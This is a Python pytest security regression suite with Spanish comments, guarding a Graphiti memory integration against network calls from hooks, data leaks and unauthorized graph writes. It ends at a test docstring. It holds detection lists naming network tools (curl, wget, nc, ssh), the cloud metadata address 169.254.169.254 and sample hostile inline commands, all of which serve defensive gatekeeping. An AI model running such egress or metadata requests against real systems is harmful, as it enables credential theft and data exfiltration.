#!/usr/bin/env python3
"""Suite de REGRESION DE SEGURIDAD de la memoria Graphiti (iniciativa `graphiti-memory`, T-09).

No repite los tests del adaptador (`skills/knowledge-services/scripts/test_backend_graphiti.py`):
pina, con tests PROPIOS y desde la raiz del repo, los invariantes que la spec declara fuera de
alcance o fail-closed y que un cambio futuro podria romper en silencio:

  1. **Ninguna llamada de red desde hooks** (`spec.md`, «Fuera de alcance»): ningun script
     alcanzable desde `hooks/hooks.json` -recorrido TRANSITIVO de los `.sh`/`.py` que cita el
     CODIGO, no los comentarios- importa `urllib.request`/`http.client`/`socket` con fines de
     conexion, ni invoca `knowledge-sync.py`/`capabilities.py`, ni pasa `--intent`/`--backends-dir`
     a `knowledge-find.py`; ademas, el argv REAL que `hooks/session-context.sh` le pasa no llega a
     `cargar_adaptador` (espia vivo, no solo lectura estatica).
  2. **Ningun dato excluido llega al grafo** (CA-01/CA-07): con un `approved/` que mezcla
     categorias con y sin `routing.graphiti`, mas ficheros FUERA de `approved/` (journal,
     candidates, un `.log` de prompts y un fichero con «prompt» en el nombre), `knowledge-sync`
     solo genera `add_memory` de las entradas aprobadas Y enrutadas, y ningun `episode_body`
     contiene texto de lo excluido.
  3. **CA-14**: una salida estructurada INVALIDA del proveedor `ollama` degrada a dead-letter via
     `outbox.py` sin corromper el grafo ni el manifiesto publicado; **CA-04**: endpoint apagado y
     backend sin datos degradan sin bloquear el ciclo.
  4. **CA-05**: ninguna pieza fuera de la skill `knowledge-services` invoca escritura en el grafo
     (`add_memory`/`add_triplet`/`clear_graph`/`delete_*`/`knowledge-sync --backend graphiti apply`)
     y ningun agente distinto de `knowledge-curator` (que documenta la PROHIBICION) cita el
     backend — Puerta E18 de `docs/agents/CONTRACTS.md`.
  5. **Guardarrail de red del cliente MCP** como regresion del REPO: IMDS en sus cuatro formas,
     `0.0.0.0`/`::`, hosts publicos sin `allow_remote`, redirecciones 301/302/303 no seguidas y la
     sesion que no cruza `(esquema, host, puerto)` — con servidores efimeros propios en loopback y
     cero `connect()` real fuera de loopback.

Sin red real: el servidor Graphiti de `127.0.0.1:8001` NO interviene (se reutiliza el servidor MCP
FALSO de la suite del adaptador y se levantan servidores efimeros propios en `127.0.0.1:0`).

Ejecutar: python -m pytest -q tests/test_graphiti_security.py
"""
import ast
import importlib.util
import json
import os
import re
import shutil
import socket
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOOKS_JSON = os.path.join(ROOT, "hooks", "hooks.json")
SHARED = os.path.join(ROOT, "agent-kits", "shared")
KS_SCRIPTS = os.path.join(ROOT, "skills", "knowledge-services", "scripts")
KS_BACKENDS = os.path.join(ROOT, "skills", "knowledge-services", "backends")


def _cargar(ruta, nombre):
    spec = importlib.util.spec_from_file_location(nombre, ruta)
    mod = importlib.util.module_from_spec(spec)
    sys.modules[nombre] = mod
    spec.loader.exec_module(mod)
    return mod


# El servidor MCP falso (fixtures reales capturadas del stack) y el constructor de entradas se
# REUTILIZAN; los tests de abajo son propios.
#
# Gap #166 (Minor, fix1 Fase 4): antes se importaba `test_backend_graphiti.py` POR RUTA con un
# nombre de modulo propio, asi que bajo la invocacion unica de pytest de CI ese fichero de tests se
# cargaba DOS veces (dos juegos de fixtures y dos clases de handler, con estado compartido entre
# suites). Ahora las dos suites cargan el modulo de APOYO `_mcp_fake.py` con el mismo nombre
# canonico y comprobando `sys.modules`: una sola ejecucion por proceso.
def _cargar_apoyo_mcp():
    nombre = "ks_graphiti_mcp_fake"
    if nombre in sys.modules:
        return sys.modules[nombre]
    return _cargar(os.path.join(KS_SCRIPTS, "_mcp_fake.py"), nombre)


_apoyo_mcp = _cargar_apoyo_mcp()
ServidorMCP = _apoyo_mcp._ServidorMCPContext

ks_sync = _cargar(os.path.join(KS_SCRIPTS, "knowledge-sync.py"), "ks_sync_seguridad")
gr = _cargar(os.path.join(KS_BACKENDS, "graphiti.py"), "ks_graphiti_seguridad")
kf = _cargar(os.path.join(SHARED, "knowledge-find.py"), "kf_seguridad")
ob = _cargar(os.path.join(SHARED, "outbox.py"), "outbox_seguridad")


# ====================================================================== 1. sin red desde hooks

_TERMINOS_RED = ("urllib", "urlopen", "http.client", "httpx", "requests.", "socket.socket",
                 "socket.create_connection", "curl ", "wget ", "invoke-webrequest",
                 # gap #155: una cadena INLINE de un hook no es python, asi que el termino
                 # peligroso puede ser un binario o una IP a pelo (IMDS de nube).
                 "169.254.169.254", "metadata.google.internal")
# Binarios de red que solo tienen sentido en una cadena INLINE (no son python): se buscan
# TOKENIZANDO, no como subcadena (`nc ` casaria dentro de `sync `, `func `...).
_BINARIOS_DE_RED = {"curl", "wget", "nc", "ncat", "telnet", "ssh", "scp", "invoke-webrequest"}
_MODULOS_RED = {"urllib", "urllib.request", "urllib.parse", "http.client", "httplib", "socket",
                "requests", "httpx", "ssl"}
# Los dos scripts que los hooks SI invocan y que definen en su propio argparse los flags
# prohibidos: la prohibicion es para quien los LLAMA, no para la herramienta que los declara.
_HERRAMIENTAS = {"knowledge-find.py", "capabilities.py"}
_MAX_SALTOS = 5
# Gap #177 (Minor, fix2 Fase 4): la puerta solo sabe ESCANEAR `.py` y `.sh`; una cita a otro
# ejecutable (`node "…/hooks/exfil.js"`, un `.ps1`, un `.cmd`) no se recorria NI contaba como cita
# sin resolver, asi que la lista blanca vacia no estaba impuesta. Ahora esas citas se reconocen y
# son FALLO salvo que esten en `_EJECUTABLES_NO_ESCANEABLES_PERMITIDOS` (vacia a proposito).
_EXT_ESCANEABLES = ("py", "sh")
_EXT_NO_ESCANEABLES = ("js", "mjs", "ps1", "cmd")
_EJECUTABLES_NO_ESCANEABLES_PERMITIDOS = ()
_EXT_RE = "|".join(_EXT_ESCANEABLES + _EXT_NO_ESCANEABLES)
# Gap #155 (Important, fix1 Fase 4): el lookahead final quita los falsos positivos del escaneo de
# CODIGO (`hashlib.sha256` casaba como `hashlib.sh`). Hace falta porque a partir de este fix una
# cita que no resuelve YA NO se descarta en silencio: es un fallo. Gap #182 (fix2): el prefijo
# opcional `$VAR/` o `${VAR:-…}/` se captura aparte (`var`), porque sin fallback por basename una
# cita `"$SHARED/journal.py"` solo se puede resolver sabiendo a que apunta `SHARED`.
_RUTA_RE = re.compile(r"""(?:\$\{?(?P<var>\w+)[^}\s"'/]*\}?)?(?P<ruta>[\w./\\-]+\.(?:%s))(?![\w])"""
                      % _EXT_RE)
# Token de una cita dentro de una cadena de shell (`bash "${X}/hooks/a.sh"`, `python3 "$S/b.py"`).
_TOKEN_SCRIPT_RE = re.compile(r"""[^\s"'`;|&()]*\.(?:%s)(?![\w])""" % _EXT_RE)
_EXPANSION_SHELL_RE = re.compile(r"\$\{[^}]*\}|\$\w+")
# Lista blanca EXPLICITA de citas que no corresponden a un fichero del repo. Vacia a proposito:
# todo hook del plugin invoca scripts del plugin. Añadir una entrada aqui es una decision
# consciente y revisable, no el descarte silencioso que encontro el gap #155.
_CITAS_SIN_FICHERO_PERMITIDAS = ()
# Gap #182 (Minor, fix2 Fase 4): `_resolver` ya NO busca por basename en carpetas «probables» (una
# cita a `agent-kits/implementer/tools/journal.py`, que no existe, acababa leyendo el `journal.py`
# de `shared/`). Una cita se resuelve SOLO por su ruta literal: relativa a la raiz del repo (o a
# `${CLAUDE_PLUGIN_ROOT}`), relativa al directorio del fichero que la cita, o tras expandir una
# variable asignada en el propio `.sh`. Las citas del repo que nombran un script SIN ruta -porque
# el directorio va en una variable de Python (`os.path.join(shared, "knowledge-find.py")`)- se
# declaran aqui UNA A UNA: `(fichero que cita, nombre citado) -> destino`.
_CITAS_POR_NOMBRE = {
    ("hooks/session-context.sh", "knowledge-find.py"): "agent-kits/shared/knowledge-find.py",
    ("hooks/session-context.sh", "progress-report.py"): "agent-kits/shared/progress-report.py",
    ("agent-kits/shared/knowledge-find.py", "__init__.py"):
        "skills/knowledge-services/backends/__init__.py",
    ("agent-kits/shared/knowledge-find.py", "session-context.sh"): "hooks/session-context.sh",
}
_VARIABLES_DE_RAIZ = ("CLAUDE_PLUGIN_ROOT", "CLAUDE_PROJECT_DIR")
# Gap #173 (Important, fix2 Fase 4): los binarios de red se buscaban como TOKEN solo en las cadenas
# inline; en el codigo de un script alcanzable, `subprocess.run(["curl", "-s", URL])` (lista: sin la
# subcadena `"curl "` tras `ast.unparse`) pasaba. Ahora el AST de cada `.py` alcanzable mira los
# argv literales (lista/tupla cuyo primer elemento es un binario), las cadenas de shell que se
# pasan a `subprocess.*`/`os.system`/`os.popen`/`os.exec*`/`os.spawn*`/`Popen` y el CLI `claude`
# (`which("claude")`, `[exe, "-p", ...]`): lanzar `claude -p` es egress hacia la API.
_BINARIOS_DE_EGRESS = _BINARIOS_DE_RED | {"claude"}
_SHELLS = {"sh", "bash", "zsh", "dash", "cmd", "powershell", "pwsh"}
_FUNCIONES_QUE_EJECUTAN = {"system", "popen", "run", "call", "check_call", "check_output",
                           "Popen", "getoutput", "getstatusoutput", "create_subprocess_exec",
                           "create_subprocess_shell"}
_PREFIJOS_QUE_EJECUTAN = ("exec", "spawn")
# Excepcion NOMINAL al invariante «ninguna llamada de red desde hooks» (gap #173, conciliada en
# `design.md`): el resumen IA del journal de sesion lanza `claude -p --bare` SOLO con `dev.json`
# `sesion.resumen: true` (ADR-010 revisado, ADR-013). Vale para ESTE fichero y ESTOS motivos, y
# solo mientras `_egress_del_journal_sin_condicion` no encuentre nada: si la guardia desaparece, la
# excepcion deja de aplicarse y la puerta se pone roja.
_EGRESS_OPT_IN_DECLARADO = {
    "agent-kits/shared/journal.py": {
        "motivos": ("ejecutable claude", "argv <variable> -p"),
        "condicion": "`dev.json` sesion.resumen: true (`ia_activa`) o `--ia on` explicito, que "
                     "ningun hook pasa",
        "decision": "ADR-010 revisado / ADR-013; design.md, enmienda fix2 Fase 4",
    },
}
_FLAGS_QUE_CARGAN_ADAPTADOR = ("--intent", "--backends-dir")
_SCRIPTS_CON_RED = ("knowledge-sync.py", "capabilities.py")


def _texto(ruta):
    with open(ruta, "rb") as f:
        crudo = f.read()
    try:
        return crudo.decode("utf-8")
    except UnicodeDecodeError as e:          # nunca un skip silencioso
        raise AssertionError("`%s` no decodifica en UTF-8: %s" % (ruta, e)) from e


def _sin_docstrings(arbol):
    """Quita TODA sentencia-expresion de cadena (docstrings incluidos): un docstring que MENCIONE
    `urllib` o `knowledge-sync.py` no es una llamada de red (los comentarios ya no sobreviven al
    parseo del AST)."""
    for nodo in ast.walk(arbol):
        cuerpo = getattr(nodo, "body", None)
        if isinstance(cuerpo, list):
            nodo.body = [s for s in cuerpo
                         if not (isinstance(s, ast.Expr) and isinstance(s.value, ast.Constant)
                                 and isinstance(s.value.value, str))] or [ast.Pass()]
    return arbol


def _codigo(ruta):
    """Texto de CODIGO del fichero, sin comentarios ni docstrings. `.py` se reescribe desde el AST;
    `.sh` pierde sus lineas de comentario (incluidos los heredoc de python que llevan dentro)."""
    texto = _texto(ruta)
    if ruta.endswith(".py"):
        try:
            return ast.unparse(_sin_docstrings(ast.parse(texto)))
        except SyntaxError as e:
            raise AssertionError("`%s` no parsea: %s" % (ruta, e)) from e
    return "\n".join(_sin_comentario_shell(l) for l in texto.splitlines())


def _sin_comentario_shell(linea):
    """Gap #183 (Minor, fix2 Fase 4): quita el comentario FINAL de una linea de shell (`… # nota:
    no usamos ssh` daba `ssh` como binario de red). Un `#` solo abre comentario fuera de comillas
    y al principio de palabra (tras blanco, `;`, `|`, `&` o `(`): `${#ARR[@]}`, `$#`, `a#b` y
    `"… # …"` no son comentarios. Ante comillas desparejadas no corta (conservador: mas texto que
    escanear, nunca menos)."""
    comilla = None
    for i, c in enumerate(linea):
        if comilla:
            if c == comilla and (comilla == "'" or i == 0 or linea[i - 1] != chr(92)):
                comilla = None
        elif c in "'\"":
            comilla = c
        elif c == "#" and (i == 0 or linea[i - 1] in " \t;|&("):
            return linea[:i].rstrip()
    return linea


_IMPORT_NO_LITERAL = "<import dinamico no literal>"


def _modulos_importados(ruta):
    """Modulos que importa un `.py`. Gap #176 (Minor, fix2 Fase 4): `__import__("socket")` e
    `importlib.import_module("socket")` con nombre LITERAL cuentan como import; con un nombre que
    no es literal (`"sock" + "et"`, una variable) no se puede verificar y se marca
    `_IMPORT_NO_LITERAL`, que la puerta trata como FALLO."""
    if not ruta.endswith(".py"):
        return set()
    modulos = set()
    for nodo in ast.walk(ast.parse(_texto(ruta))):
        if isinstance(nodo, ast.Import):
            modulos |= {a.name for a in nodo.names}
        elif isinstance(nodo, ast.ImportFrom) and nodo.module:
            modulos.add(nodo.module)
        elif isinstance(nodo, ast.Call) and _nombre_llamada(nodo) in ("__import__", "import_module"):
            primero = nodo.args[0] if nodo.args else None
            if isinstance(primero, ast.Constant) and isinstance(primero.value, str):
                modulos.add(primero.value)
            else:
                modulos.add(_IMPORT_NO_LITERAL)
    return modulos


def _nombre_llamada(nodo):
    """Ultimo componente del nombre de la funcion llamada (`subprocess.run` -> `run`)."""
    funcion = nodo.func
    if isinstance(funcion, ast.Attribute):
        return funcion.attr
    if isinstance(funcion, ast.Name):
        return funcion.id
    return ""


def _binario(valor):
    base = os.path.basename(valor.replace(chr(92), "/")).lower()
    return base[:-4] if base.endswith(".exe") else base


def _tokens_de_shell(cadena):
    return [t.strip("/" + chr(92)) for t in re.split(r"""[\s;|&()"'`]+""",
                                                    _sin_comentario_shell(cadena).lower()) if t]


def _literal(nodo):
    return nodo.value if isinstance(nodo, ast.Constant) and isinstance(nodo.value, str) else None


def _egress_por_ast(ruta):
    """Gap #173: motivos de egress en el CODIGO de un `.py` (no en sus comentarios/docstrings):
    `argv <binario>` (lista/tupla literal que arranca por un binario de red o por `claude`),
    `shell <binario>` (cadena de shell pasada a una funcion que ejecuta, o tras `sh -c`),
    `exec <binario>` (`os.exec*`/`os.spawn*` con la ruta literal), `ejecutable claude` (el literal
    `"claude"` como argumento, p. ej. `shutil.which("claude")`) y `argv <variable> -p` (argv cuyo
    ejecutable es una variable con el `-p` del CLI headless)."""
    if not ruta.endswith(".py"):
        return []
    motivos = []
    for nodo in ast.walk(_sin_docstrings(ast.parse(_texto(ruta)))):
        if isinstance(nodo, (ast.List, ast.Tuple)) and nodo.elts:
            elementos = [_literal(e) for e in nodo.elts]
            if elementos[0] is not None:
                binario = _binario(elementos[0])
                if binario in _BINARIOS_DE_EGRESS:
                    motivos.append("argv " + binario)
                elif binario in _SHELLS:
                    for cadena in elementos[1:]:
                        if cadena and cadena.lower() not in ("-c", "/c", "-command"):
                            motivos += ["shell " + t for t in _tokens_de_shell(cadena)
                                        if t in _BINARIOS_DE_EGRESS]
            elif "-p" in elementos:
                motivos.append("argv <variable> -p")
        elif isinstance(nodo, ast.Call):
            nombre = _nombre_llamada(nodo)
            literales = [_literal(a) for a in nodo.args]
            if "claude" in [(_binario(l) if l else None) for l in literales]:
                motivos.append("ejecutable claude")
            ejecuta = (nombre in _FUNCIONES_QUE_EJECUTAN
                       or nombre.startswith(_PREFIJOS_QUE_EJECUTAN))
            if ejecuta and literales and literales[0] is not None:
                if nombre.startswith(_PREFIJOS_QUE_EJECUTAN):
                    if _binario(literales[0]) in _BINARIOS_DE_EGRESS:
                        motivos.append("exec " + _binario(literales[0]))
                else:
                    motivos += ["shell " + t for t in _tokens_de_shell(literales[0])
                                if t in _BINARIOS_DE_EGRESS]
    return motivos


def _egress_del_journal_sin_condicion(texto):
    """Condicion de la excepcion nominal del journal (gap #173). Devuelve lo que la ROMPE (vacio =
    la excepcion se sostiene): `ia_activa` debe exigir `sesion.resumen` `is True`, y TODA llamada a
    `resumen_ia` debe ir dentro de un `if` que dependa de `ia_activa(root)`."""
    arbol = ast.parse(texto)
    problemas = []
    activa = [n for n in ast.walk(arbol) if isinstance(n, ast.FunctionDef) and n.name == "ia_activa"]
    if not activa or ".get('resumen') is True" not in ast.unparse(activa[0]):
        problemas.append("`ia_activa` ya no exige `sesion.resumen` `is True`")
    padres = {}
    for padre in ast.walk(arbol):
        for hijo in ast.iter_child_nodes(padre):
            padres[hijo] = padre
    for nodo in ast.walk(arbol):
        if isinstance(nodo, ast.Call) and _nombre_llamada(nodo) == "resumen_ia":
            actual, guardado = nodo, False
            while actual in padres:
                actual = padres[actual]
                if isinstance(actual, ast.If) and "ia_activa(root)" in ast.unparse(actual.test):
                    guardado = True
                    break
            if not guardado:
                problemas.append("`resumen_ia` en la linea %d no depende de `ia_activa(root)`"
                                 % nodo.lineno)
    return problemas


def _resolver(ruta_rel, root=ROOT, citante=None):
    """Ruta real de un script citado, SOLO por su ruta literal (gap #182: sin fallback por
    basename): relativa a la raiz del repo (lo que queda de `${CLAUDE_PLUGIN_ROOT}/…`), relativa al
    directorio del fichero que la cita (`$(dirname "$0")/x.sh`, `os.path.join(aqui, "x.py")`) o,
    para un nombre sin ruta, por la tabla nominal `_CITAS_POR_NOMBRE`. Nunca fuera de la raiz."""
    ruta_rel = ruta_rel.replace("\\", "/").lstrip("$")
    # patron de `find -path "*hooks/x.sh"` (el fallback de la regla 5): la parte tras el ultimo
    # comodin ES la ruta literal relativa a la raiz del plugin
    relativa = ruta_rel.rsplit("*", 1)[-1].lstrip("/")
    if not relativa or relativa.lower() in tuple("." + e for e in _EXT_ESCANEABLES + _EXT_NO_ESCANEABLES):
        return None                       # cita vacia: lo que queda de `${BASE}.py` (gap #155)
    raiz = os.path.normpath(root)
    bases = [root] + ([os.path.dirname(citante)] if citante else [])
    for base in bases:
        candidato = os.path.normpath(os.path.join(base, relativa))
        if candidato.startswith(raiz + os.sep) and os.path.isfile(candidato):
            return candidato
    if citante and "/" not in relativa:
        clave = (os.path.relpath(citante, root).replace(os.sep, "/"), relativa)
        destino = _CITAS_POR_NOMBRE.get(clave)
        if destino and os.path.isfile(os.path.join(root, destino)):
            return os.path.normpath(os.path.join(root, destino))
    return None


def _valor_de_variable_shell(texto, variable):
    """Parte literal (tras la ultima expansion) de la PRIMERA asignacion `VAR=…` de un `.sh`:
    `SHARED="${CLAUDE_PLUGIN_ROOT:-}/agent-kits/shared"` -> `/agent-kits/shared`. `None` si la
    variable no se asigna en el fichero."""
    m = re.search(r"^[ \t]*(?:export[ \t]+)?%s=(?P<valor>.*)$" % re.escape(variable), texto, re.M)
    if not m:
        return None
    valor = _sin_comentario_shell(m.group("valor")).strip().strip("\"'")
    return _parte_literal(valor)


def _resolver_cita_de_codigo(m, ruta_citante, texto_citante, root):
    """Resuelve una cita encontrada por `_RUTA_RE` en el codigo de `ruta_citante`."""
    variable, ruta = m.group("var"), m.group("ruta")
    if variable in _VARIABLES_DE_RAIZ:
        return _resolver(ruta, root)
    if variable:
        prefijo = (_valor_de_variable_shell(texto_citante, variable)
                   if ruta_citante.endswith(".sh") else None)
        return _resolver(prefijo.rstrip("/") + "/" + ruta.lstrip("/"), root) if prefijo else None
    return _resolver(ruta, root, citante=ruta_citante)


def _es_no_escaneable(cita):
    return cita.rsplit(".", 1)[-1].lower() in _EXT_NO_ESCANEABLES


def _parte_literal(token):
    """Parte VERIFICABLE de una cita: lo que queda tras la ULTIMA expansion de variable.
    `${CLAUDE_PLUGIN_ROOT}/hooks/session-context.sh` -> `/hooks/session-context.sh` (resuelve);
    `$SHARED/${BASE}.py` -> `.py` (no resuelve: una cita compuesta con variables no se puede
    verificar estaticamente y, desde el gap #155, es un FALLO, no un descarte silencioso)."""
    trozos = list(_EXPANSION_SHELL_RE.finditer(token))
    return token[trozos[-1].end():] if trozos else token


def _citas_de_cadena(texto):
    """Citas a `.py`/`.sh` que aparecen en una cadena de shell, en su forma ORIGINAL (para poder
    decir en el fallo que la cita venia compuesta por variables)."""
    return {m.group(0) for m in _TOKEN_SCRIPT_RE.finditer(texto)}


def _bloque_hooks_frontmatter(texto):
    """Bloque `hooks:` del frontmatter YAML de un agente (ADR-007), hasta la siguiente clave de
    primer nivel. `None` si el agente no declara hooks."""
    texto = texto.replace(chr(13) + chr(10), chr(10))   # el repo usa CRLF: sin esto no casa
    m = re.search(r"^hooks:[ \t]*\n(?P<bloque>(?:[ \t].*\n|\n)*)", texto, re.M)
    return m.group("bloque") if m else None


def _cadenas_inline(root=ROOT):
    """[(origen, cadena)] con TODO lo que arranca un hook SIN pasar por un fichero del repo: las
    cadenas `command`/`args` de `hooks/hooks.json` y las del bloque `hooks:` del frontmatter de
    cada `agents/*.md` (ADR-007: el guardarrail del implementer/architect vive ahi, no en
    `hooks.json`). El gap #155 las tenia fuera del recorrido -solo se miraban los ficheros a los
    que resolvian-, asi que un `curl` o un `--intent` escritos ALLI MISMO pasaban en vacio."""
    cadenas = []
    ruta_json = os.path.join(root, "hooks", "hooks.json")
    if os.path.isfile(ruta_json):
        with open(ruta_json, encoding="utf-8") as f:
            config = json.load(f)
        for evento, eventos in sorted((config.get("hooks") or {}).items()):
            for bloque in eventos:
                for hook in bloque.get("hooks") or []:
                    # gap #183: el comentario final no es parte de lo que se ejecuta
                    cadenas.append(("hooks/hooks.json %s command" % evento,
                                    _sin_comentario_shell(str(hook.get("command", "")))))
                    for indice, arg in enumerate(hook.get("args") or []):
                        cadenas.append(("hooks/hooks.json %s args[%d]" % (evento, indice),
                                        _sin_comentario_shell(str(arg))))
    base_agentes = os.path.join(root, "agents")
    if os.path.isdir(base_agentes):
        for nombre in sorted(os.listdir(base_agentes)):
            if not nombre.endswith(".md"):
                continue
            bloque = _bloque_hooks_frontmatter(_texto(os.path.join(base_agentes, nombre)))
            if not bloque:
                continue
            for numero, linea in enumerate(bloque.splitlines(), 1):
                linea = _sin_comentario_shell(linea)
                if linea.strip():
                    cadenas.append(("agents/%s hooks: L%d" % (nombre, numero), linea))
    return cadenas


def _recorrido_hooks(root=ROOT):
    """Cierre TRANSITIVO (hasta `_MAX_SALTOS`) de lo que los hooks alcanzan, partiendo de las dos
    fuentes reales (`hooks.json` Y los frontmatter `hooks:`). Devuelve
    `({etiqueta relativa: ruta absoluta}, [(origen, cita) de las citas que NO resuelven])`."""
    pendientes, sin_resolver = set(), []
    for origen, cadena in _cadenas_inline(root):
        for cita in sorted(_citas_de_cadena(cadena)):
            if _es_no_escaneable(cita):   # gap #177: nada que la puerta sepa escanear
                if cita not in _EJECUTABLES_NO_ESCANEABLES_PERMITIDOS:
                    sin_resolver.append((origen, cita))
                continue
            resuelta = _resolver(_parte_literal(cita), root)
            if resuelta:
                pendientes.add(resuelta)
            elif cita not in _CITAS_SIN_FICHERO_PERMITIDAS:
                sin_resolver.append((origen, cita))
    vistos = {}
    for _salto in range(_MAX_SALTOS):
        siguientes = set()
        for resuelta in sorted(pendientes):
            etiqueta = os.path.relpath(resuelta, root).replace(os.sep, "/")
            if etiqueta in vistos:
                continue
            vistos[etiqueta] = resuelta
            codigo = _codigo(resuelta)
            for m in sorted(_RUTA_RE.finditer(codigo), key=lambda x: x.group(0)):
                cita = m.group(0)
                if _es_no_escaneable(cita):
                    if cita not in _EJECUTABLES_NO_ESCANEABLES_PERMITIDOS:
                        sin_resolver.append((etiqueta, cita))
                    continue
                destino = _resolver_cita_de_codigo(m, resuelta, codigo, root)
                if destino:
                    siguientes.add(destino)
                elif cita not in _CITAS_SIN_FICHERO_PERMITIDAS:
                    sin_resolver.append((etiqueta, cita))
        pendientes = siguientes
        if not pendientes:
            break
    return vistos, sin_resolver


def _fuentes_ejecutables(root=ROOT):
    """[(etiqueta, texto, ruta_o_None)] de TODO lo que un hook ejecuta: las cadenas inline (que no
    tienen fichero detras) y el CODIGO de cada script alcanzable."""
    fuentes = [(origen, cadena, None) for origen, cadena in _cadenas_inline(root)]
    alcanzables, _ = _recorrido_hooks(root)
    fuentes += [(etiqueta, _codigo(ruta), ruta) for etiqueta, ruta in sorted(alcanzables.items())]
    return fuentes


def _ofensores_de_red(root=ROOT, excepciones=None):
    """`[(etiqueta, motivo)]` de todo lo que un hook alcanza y toca la red. `excepciones` (por
    defecto `_EGRESS_OPT_IN_DECLARADO`) retira SOLO los motivos declarados del fichero declarado, y
    solo si su condicion se sostiene (`excepciones={}` devuelve el crudo del detector)."""
    excepciones = _EGRESS_OPT_IN_DECLARADO if excepciones is None else excepciones
    ofensores = []
    for etiqueta, texto, ruta in _fuentes_ejecutables(root):
        bajo = texto.lower()
        propios = []
        for termino in _TERMINOS_RED:
            if termino in bajo:
                propios.append(termino)
        modulos = _modulos_importados(ruta) if ruta else set()
        propios += ["import " + modulo for modulo in sorted(modulos & _MODULOS_RED)]
        if _IMPORT_NO_LITERAL in modulos:
            propios.append("import dinamico no literal")
        if ruta is None:                  # cadena inline: ademas, binarios de red como TOKEN
            propios += [t for t in _tokens_de_shell(bajo) if t in _BINARIOS_DE_RED]
        else:                             # gap #173: argv/shell/exec/claude en el AST del codigo
            propios += sorted(set(_egress_por_ast(ruta)))
        declarada = excepciones.get(etiqueta)
        if declarada and ruta and not _egress_del_journal_sin_condicion(_texto(ruta)):
            propios = [m for m in propios if m not in declarada["motivos"]]
        ofensores += [(etiqueta, m) for m in propios]
    return ofensores


def _ofensores_de_scripts_con_red(root=ROOT):
    ofensores = []
    for etiqueta, texto, ruta in _fuentes_ejecutables(root):
        for prohibido in _SCRIPTS_CON_RED:
            if prohibido in texto and (ruta is None or os.path.basename(ruta) != prohibido):
                ofensores.append((etiqueta, prohibido))
    return ofensores


def _ofensores_de_flags_de_adaptador(root=ROOT):
    ofensores = []
    for etiqueta, texto, ruta in _fuentes_ejecutables(root):
        if ruta is not None and os.path.basename(ruta) in _HERRAMIENTAS:
            continue                      # la herramienta DECLARA el flag; no se lo pasa a nadie
        for flag in _FLAGS_QUE_CARGAN_ADAPTADOR:
            if flag in texto:
                ofensores.append((etiqueta, flag))
    return ofensores


def test_el_recorrido_alcanza_de_verdad_los_scripts_de_los_hooks():
    """Andamiaje del resto de la seccion: si el recorrido dejara de encontrar los scripts reales,
    los tests de abajo pasarian EN VACIO (el fallo mas peligroso de un escaneo). Gap #155: exige
    tambien los hooks del FRONTMATTER (ADR-007) y su cierre transitivo (`guardrail-check.py`),
    que antes quedaban fuera del recorrido."""
    alcanzables, _ = _recorrido_hooks()
    for esperado in ("hooks/session-context.sh", "hooks/session-journal.sh",
                     "agent-kits/shared/journal.py", "agent-kits/shared/outbox.py",
                     "agent-kits/shared/knowledge-find.py", "agent-kits/shared/skill-index.py",
                     # hooks declarados en el frontmatter de un agente, no en `hooks.json`
                     "hooks/implementer-guardrail.sh", "hooks/architect-guardrail.sh",
                     "agent-kits/shared/guardrail-check.py"):
        assert esperado in alcanzables, (esperado, sorted(alcanzables))
    assert len(alcanzables) >= 8, sorted(alcanzables)
    origenes = {o.split(" ")[0] for o, _ in _cadenas_inline()}
    assert "hooks/hooks.json" in origenes and "agents/implementer.md" in origenes, sorted(origenes)


def test_toda_cita_de_script_desde_un_hook_resuelve_a_un_fichero_real():
    """Gap #155: una cita que no resolvia se descartaba EN SILENCIO (`continue`), asi que un hook
    que invocase su script por VARIABLE (`python3 "$SHARED/${BASE}.py"`) era invisible para toda
    la seccion. Ahora es un fallo: o la cita se puede verificar, o esta en la lista blanca."""
    _alcanzables, sin_resolver = _recorrido_hooks()
    assert sin_resolver == [], sin_resolver


def test_ningun_script_alcanzable_desde_hooks_toca_la_red():
    """«Llamadas de red en hooks» esta FUERA DE ALCANCE (spec.md). Se mira el CODIGO (sin
    comentarios ni docstrings) de todo el cierre transitivo Y las cadenas inline que arrancan los
    hooks (gap #155: un `curl http://169.254.169.254/...` escrito en el propio `hooks.json` o en
    el frontmatter de un agente no pasa por ningun fichero)."""
    assert _ofensores_de_red() == [], _ofensores_de_red()


def test_ningun_script_alcanzable_desde_hooks_invoca_el_sincronizador_ni_capabilities():
    """`knowledge-sync.py` y `capabilities.py` son caminos que cargan un adaptador de backend
    (codigo CON capacidad de red): ningun hook puede llegar a ellos, ni por fichero ni inline."""
    assert _ofensores_de_scripts_con_red() == [], _ofensores_de_scripts_con_red()


def test_ningun_hook_pasa_intent_ni_backends_dir_a_knowledge_find():
    """`--intent`/`--backends-dir` son los UNICOS flags de `knowledge-find.py` que cargan un
    adaptador (CA-12): ningun llamador alcanzable desde los hooks los usa, tampoco en la cadena
    `command` del propio `hooks.json` ni en el frontmatter de un agente (gap #155)."""
    assert _ofensores_de_flags_de_adaptador() == [], _ofensores_de_flags_de_adaptador()


# --------------------------------------------------------- mutantes de la puerta (gap #155)
# Cada mutante reproduce una de las tres formas en las que la puerta pasaba en vacio, sobre un repo
# MINIMO en `tmp_path` (jamas sobre el arbol real).

def _repo_minimo(tmp_path, hooks_json=None, agente=None, ficheros=None):
    """Repo de mentira con la forma que el recorrido necesita: `hooks/hooks.json`, `agents/*.md`
    con su frontmatter y los scripts que se citen."""
    root = os.path.join(str(tmp_path), "repo-mutante")
    _escribir(os.path.join(root, "hooks", "hooks.json"),
              json.dumps(hooks_json if hooks_json is not None else {"hooks": {}}))
    os.makedirs(os.path.join(root, "agents"), exist_ok=True)
    # `_escribir` abre en modo texto: en Windows traduce y un contenido que YA venia con CRLF
    # (todo fichero del repo) acabaria con un retorno de carro duplicado, que ningun parser
    # reconoce.
    _lf = lambda c: c.replace(chr(13) + chr(10), chr(10))
    if agente:
        _escribir(os.path.join(root, "agents", "implementer.md"), _lf(agente))
    for rel, contenido in (ficheros or {}).items():
        _escribir(os.path.join(root, *rel.split("/")), _lf(contenido))
    return root


def _hooks_json_con(comando):
    return {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": comando}]}]}}


def test_mutante_h6_un_hook_que_pasa_intent_inline_no_pasa_la_puerta(tmp_path):
    """Mutante H6: `hooks.json` invoca `knowledge-find.py --intent relacional` en la propia cadena
    `command` (el flag que carga un adaptador con red). Con el escaneo anterior: 23 passed."""
